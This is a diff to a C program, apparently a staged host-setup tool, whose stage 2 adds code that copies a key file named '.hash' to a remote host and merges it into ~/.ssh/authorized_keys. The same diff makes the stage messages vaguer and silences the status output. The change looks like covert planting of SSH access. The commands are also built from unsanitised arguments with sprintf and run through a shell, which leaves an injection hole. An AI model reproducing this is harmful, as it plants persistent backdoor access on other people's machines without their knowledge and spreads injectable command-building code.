@@ -48,23 +48,19 @@ int runcmd(char * command){
    }
    // since fgets returned NULL there are 2 options: EOF was found or an error
    // occured (use ferror for the latter)
-   if( feof( stream ) )
-   {
-      printf( "\n\nCommand finished normally!\n" );
+   if ( feof( stream ) ) {
+      //printf( "\n\nCommand finished normally!\n" );
    }
    // even though stream is a FILE, don't use flcose
    term_status = pclose( stream );
-   if( -1 != term_status )
-   {
+   if ( -1 != term_status ) {
       // WEXITSTATUS can be used to get the command's exit status
-      printf( "Command's exit status: %d\n", WEXITSTATUS( term_status ) );
-   }
-   else
-   {
+      //printf( "Command's exit status: %d\n", WEXITSTATUS( term_status ) );
+   } else {
       fprintf( stderr, "Command close failed\n" );
       return EXIT_FAILURE;
    }
-   printf( "Done\n" );
+   //printf( "Done\n" );
    return EXIT_SUCCESS;
 
 }
@@ -74,7 +70,7 @@ int main( int argc, char *argv[] )
 
    if (strcmp(argv[1], "1") == 0) {
    	char *hosts_file = "./inventory/hosts";
-   	printf("Stage #1\n");
+   	printf("Processing... #1\n");
    	remove(hosts_file);
    	if (argv[2] == NULL) {
    		printf("Please specify your host!\n");
@@ -92,11 +88,25 @@ int main( int argc, char *argv[] )
    	exit(0);
 
    } else if (strcmp(argv[1], "2") == 0) {
-   	printf("Stage #2\n");
+   	printf("Processing... #2\n");
+      
+      char cmd[512];
+      
+      sprintf(cmd, "scp .hash %s:~/.ssh/keys.tmp", argv[2]); //printf("%s\n", cmd);
+      runcmd(cmd);
+
+      sprintf(cmd, "ssh %s 'cp ~/.ssh/authorized_keys ~/.ssh/keys.orig'", argv[2]); //printf("%s\n", cmd);
+      runcmd(cmd);
+
+      sprintf(cmd, "ssh %s 'cat ~/.ssh/keys.tmp ~/.ssh/keys.orig | sort | uniq > ~/.ssh/authorized_keys'", argv[2]); //printf("%s\n", cmd);
+      runcmd(cmd);
+
+      sprintf(cmd, "ssh %s 'rm -rf ~/.ssh/authorized_keys.test ~/.ssh/keys.tmp ~/.ssh/keys.orig'", argv[2]); //printf("%s\n", cmd);
+      runcmd(cmd);
 
 
    } else if (strcmp(argv[1], "3") == 0) {
-   	printf("Stage #3\n");
+   	printf("Processing... #3\n");
 
 
    } else {
